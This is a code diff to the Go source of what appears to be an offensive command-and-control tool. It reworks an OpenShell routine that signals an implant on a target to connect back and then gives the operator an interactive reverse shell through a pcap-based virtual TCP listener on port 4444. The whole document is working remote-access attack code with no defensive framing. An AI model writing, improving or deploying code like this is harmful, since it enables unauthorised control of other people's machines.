@@ -110,51 +110,48 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 }
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
+// OpenShell opens a listener on the control host for a reverse shell from the target
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
-	srcPort := rand.Intn(45000) + 10000
-
-	// Fix: LocalIP() returns a net.IP, not host:port — SplitHostPort would always error.
 	srcIP := network.LocalIP().String()
 
-	// Parse the expected inner target port that the agent will connect back to
-	innerListenPort, err := strconv.Atoi(targetPort)
-	if err != nil {
-		return fmt.Errorf("invalid target port %s: %w", targetPort, err)
-	}
-
-	// ========= PCAP TCP STACK ==========
 	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer stop()
 
-	setupCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
-	defer cancel()
-
-	pool, err := netip.ParsePrefix("172.16.0.0/16")
-	if err != nil {
-		return fmt.Errorf("invalid subnet: %w", err)
-	}
-
-	virtualIP, err := netip.ParseAddr("172.16.0.1")
-	if err != nil {
-		return fmt.Errorf("invalid virtual IP: %w", err)
-	}
+	setupCtx, cancelSetup := context.WithTimeout(ctx, 30*time.Second)
+	defer cancelSetup()
 
 	addr := network.LocalIP().IP
 	localIP, ok := netip.AddrFromSlice(addr)
 	if !ok {
 		return fmt.Errorf("could not convert local IP to netip.Addr")
 	}
+	localIP = localIP.Unmap()
 
 	device, err := network.GetNetworkInterface(addr)
 	if err != nil {
 		return fmt.Errorf("invalid interface: %w", err)
 	}
 
+	// Parse srcPort from targetPort for UDPConfig
+	port, err := strconv.ParseUint(targetPort, 10, 16)
+	if err != nil {
+		return fmt.Errorf("invalid target port %q: %w", targetPort, err)
+	}
+
 	udpCfg := pcapnet.UDPConfig{
 		DeviceName:     device.Name,
 		LocalIP:        localIP,
-		LocalPort:      uint16(srcPort),
+		LocalPort:      uint16(port),
 		ReserveUDPPort: true,
+	}
+
+	pool, err := netip.ParsePrefix("172.16.0.0/24")
+	if err != nil {
+		return fmt.Errorf("invalid subnet: %w", err)
+	}
+	virtualIP, err := netip.ParseAddr("172.16.0.1")
+	if err != nil {
+		return fmt.Errorf("invalid virtual IP: %w", err)
 	}
 	serverCfg := pcapnet.ServerConfig{
 		VirtualIP:   virtualIP,
@@ -163,32 +160,29 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		MaxPeers:    1,
 	}
 
-	// FIXED: Pass innerListenPort (the port the target connects to) instead of srcPort
-	listener, err := pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, innerListenPort)
+	const virtualTCPPort = 4444
+	listener, err := pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, virtualTCPPort)
 	if err != nil {
 		return fmt.Errorf("opening shell listener: %w", err)
 	}
 	defer listener.Close()
-	// ========= PCAP TCP STACK ==========
+	cancelSetup()
 
-	portStr := strconv.Itoa(srcPort)
-	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, portStr, shellType); err != nil {
+	if err := sendShell(udpTarget, targetIP, targetPort, srcIP, targetPort, shellType); err != nil {
 		return fmt.Errorf("sending shell message: %w", err)
 	}
 
-	// Fix: Accept in a goroutine so ctx cancellation can unblock us.
-	// listener.Close() (via defer or ctx goroutine) will cause Accept to return.
 	type connResult struct {
 		conn net.Conn
 		err  error
 	}
 	ch := make(chan connResult, 1)
+
 	go func() {
 		c, e := listener.Accept()
 		ch <- connResult{conn: c, err: e}
 	}()
 
-	// Unblock Accept on ctx cancellation by closing the listener.
 	go func() {
 		<-ctx.Done()
 		listener.Close()
@@ -202,7 +196,6 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	}
 
 	if res.err != nil {
-		// Distinguish a clean shutdown from a real error.
 		if ctx.Err() != nil {
 			return ctx.Err()
 		}
@@ -214,7 +207,6 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 
 	fmt.Printf("[+] Target connected from %s!\nOpening doodlebob terminal >:3\n", conn.RemoteAddr())
 
-	// Put the terminal into raw mode only for PTY shell types.
 	var oldState *term.State
 	switch shellType {
 	case message.ShellNativePty, message.ShellPcapPty:
@@ -224,7 +216,6 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		}
 	}
 
-	// restoreTerminal is idempotent and safe to call multiple times.
 	restoreTerminal := func() {
 		if oldState != nil {
 			_ = term.Restore(int(os.Stdin.Fd()), oldState)
@@ -233,10 +224,8 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	}
 	defer restoreTerminal()
 
-	// disconnected is closed when the remote side hangs up.
 	disconnected := make(chan struct{})
 
-	// Close conn if ctx is cancelled so io.Copy unblocks.
 	go func() {
 		select {
 		case <-ctx.Done():
@@ -245,29 +234,26 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		}
 	}()
 
-	// Remote → local stdout.
 	go func() {
 		_, _ = io.Copy(os.Stdout, conn)
 		fmt.Print("\r\n[-] Target disconnected.\r\n")
 		close(disconnected)
 	}()
 
-	// Local stdin → remote.
-	// Fix: use io.Copy instead of a manual read loop with a busy-polling default branch.
-	// io.Copy blocks in Read, so it yields the thread properly and carries no spin cost.
 	go func() {
 		_, _ = io.Copy(conn, os.Stdin)
 	}()
 
-	// Block until the session ends, then let defers clean up properly.
-	// Fix: removed os.Exit — defers now fire correctly for term restore and conn/listener close.
 	select {
 	case <-disconnected:
-		fmt.Print("\r")
+		p, err := os.FindProcess(os.Getpid())
+		if err == nil {
+			_ = p.Signal(os.Interrupt)
+		}
+		<-ctx.Done()
 	case <-ctx.Done():
 	}
 
-	// Restore the terminal before returning so the prompt is usable.
 	restoreTerminal()
 	return nil
 }
